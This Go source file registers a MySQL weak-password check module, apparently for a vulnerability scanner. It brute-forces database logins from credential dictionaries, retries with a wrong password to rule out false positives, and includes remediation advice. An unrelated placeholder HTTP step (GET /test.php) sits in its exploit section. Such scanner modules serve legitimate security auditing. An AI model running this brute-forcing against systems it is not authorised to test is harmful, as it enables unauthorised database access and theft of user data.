package exploits

import (
    "git.gobies.org/goby/goscanner/goutils"
    "git.gobies.org/goby/goscanner/jsonvul"
    "git.gobies.org/goby/goscanner/jsonvul/protocols"
    "git.gobies.org/goby/goscanner/scanconfig"
    "git.gobies.org/goby/httpclient"
    "net/url"
    "os"
)

func init() {
    expJson := `{
    "Description": "<p>MySQL is a relational database management system. If the MySQL database service has a weak password, an attacker can use the weak password to connect to the database, which may cause user data disclosure.</p>",
    "Product": "MySQL",
    "Homepage": "https://www.oracle.com/",
    "DisclosureDate": "2017-05-04",
    "Author": "14m3ta7k",
    "Level": "3",
    "CveID": "",
    "CNNVD": [],
    "CNVD": [],
    "VulType": [
        "Weak Password"
    ],
    "Impact": "<p>Weak passwords enable attackers to easily crack passwords, obtain permissions for MySQL services, download and obtain server data, and even control the server.</p>",
    "Recommendation": "<p>1. Modify the weak password. The password should preferably contain upper and lower case letters, numbers, special characters, etc., with more than 8 digits.</p><p>2. If it is not necessary, public network access to the system is prohibited.</p><p>3. Set access policies and white list access through security devices such as firewalls.</p>",
    "FofaQuery": "protocol=\"mysql\"",
    "References": [
        "http://en.wikipedia.org/wiki/Password_strength"
    ],
    "HasExp": false,
    "ExpParams": [],
    "is0day": false,
    "ExpTips": {
        "type": "Tips",
        "content": ""
    },
    "ScanSteps": [
        {
            "BruteForce": {
                "protocol": "mysql",
                "UserPassPairFiles": [
                    "mysql_user_pass.dict"
                ]
            }
        }
    ],
    "Posttime": "2018-09-28 16:01:35",
    "Tags": [
        "Weak Password",
        "2H1W"
    ],
    "fofacli_version": "3.0.9",
    "fofascan_version": "0.1.16",
    "status": "0",
    "GobyQuery": "protocol=\"mysql\"",
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "CVEIDs": [],
    "Translation": {
        "CN": {
            "Name": "MySQL 弱口令漏洞",
            "Product": "Oracle-MySQL",
            "Description": "<p>MySQL是一个关系型数据库管理系统。MySQL数据库服务如果存在弱口令，攻击者就可利用弱口令连接数据库，可能会造成用户数据泄露。<br></p>",
            "Recommendation": "<p>1、修改弱口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>弱口令会使攻击者轻松破解口令，获取MySQL服务的权限，下载获取服务器资料，甚至控制服务器。<br></p>",
            "VulType": [
                "弱口令"
            ],
            "Tags": [
                "弱口令",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "MySQL weak password vulnerability",
            "Product": "MySQL",
            "Description": "<p>MySQL is a relational database management system. If the MySQL database service has a weak password, an attacker can use the weak password to connect to the database, which may cause user data disclosure.<br></p>",
            "Recommendation": "<p>1. Modify the weak password. The password should preferably contain upper and lower case letters, numbers, special characters, etc., with more than 8 digits.</p><p>2. If it is not necessary, public network access to the system is prohibited.</p><p>3. Set access policies and white list access through security devices such as firewalls.</p>",
            "Impact": "<p>Weak passwords enable attackers to easily crack passwords, obtain permissions for MySQL services, download and obtain server data, and even control the server.<br></p>",
            "VulType": [
                "Weak Password"
            ],
            "Tags": [
                "Weak Password",
                "2H1W"
            ]
        }
    },
    "Name": "MySQL weak password vulnerability",
    "CVSSScore": "7.5",
    "Is0day": false,
    "PocId": "9967"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
            customDictPath := os.Getenv("POC_WEAK_PWD__DICT_PATH")
            var mysqlBrute jsonvul.ScanStep
            mysqlBrute.BruteForce.Protocol = "mysql"
            if customDictPath != "" {
                file, err := os.Open(customDictPath)
                if err == nil && file != nil {
                    // 加入用户自定义字典路径
                    mysqlBrute.BruteForce.UserPassPairFiles = append(mysqlBrute.BruteForce.UserPassPairFiles, customDictPath)
                    file.Close()
                }
            }
            mysqlBrute.BruteForce.UserPassPairFiles = append(mysqlBrute.BruteForce.UserPassPairFiles, "mysql_user_pass.dict")
            bruteResult := mysqlBrute.BruteForce.BruteCheck(&exp.ScanSteps, hostInfo, stepLogs)
            stepLogs.VulURL = bruteResult.URL
            if !bruteResult.Success {
                return false
            }
            rawURL, err := url.Parse(bruteResult.URL)
            if err != nil {
                return false
            }
            if rawURL.User == nil {
                return false
            }
            password, _ := rawURL.User.Password()
            ok := protocols.MySQLCheck(hostInfo.String(), rawURL.User.Username(), password+goutils.RandomHexString(3), stepLogs.ScannerConfig)
            return !ok
        },
        nil,
    ))
}
